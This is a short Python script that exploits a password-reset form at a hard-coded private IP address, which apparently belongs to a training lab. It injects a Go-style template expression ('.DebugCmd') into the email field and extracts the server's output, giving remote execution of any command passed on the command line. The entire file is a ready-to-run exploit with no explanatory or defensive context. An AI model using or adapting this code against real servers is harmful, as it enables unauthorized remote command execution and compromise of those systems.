import requests
import argparse
import sys
import re

def parse_arguments():
    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description="Parse command-line arguments.")

    # Add a positional argument
    parser.add_argument("command", type=str, help="The name of the file to process")
    return parser.parse_args()

args = parse_arguments()

url = "http://10.10.11.113:8080/forgot/"
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.10.11.113:8080", "DNT": "1", "Connection": "close", "Referer": "http://10.10.11.113:8080/forgot/", "Upgrade-Insecure-Requests": "1"}
data = {"email": f'{{{{ .DebugCmd "{args.command}" }}}}'}
r = requests.post(url, headers=headers, data=data)
if r.status_code != 200:
    print(f"[-] Error. Status code {r.status_code!r} in request.")
    sys.exit(1)
pattern = r"Email Sent To:\s*(.*?)\s*<button class="
matches = re.findall(pattern, r.text, re.DOTALL)
if matches:
    print(f"[+] Response text:\n\n{matches[0]}")
else:
    print(f"[-] No output for the command {args.command!r}")
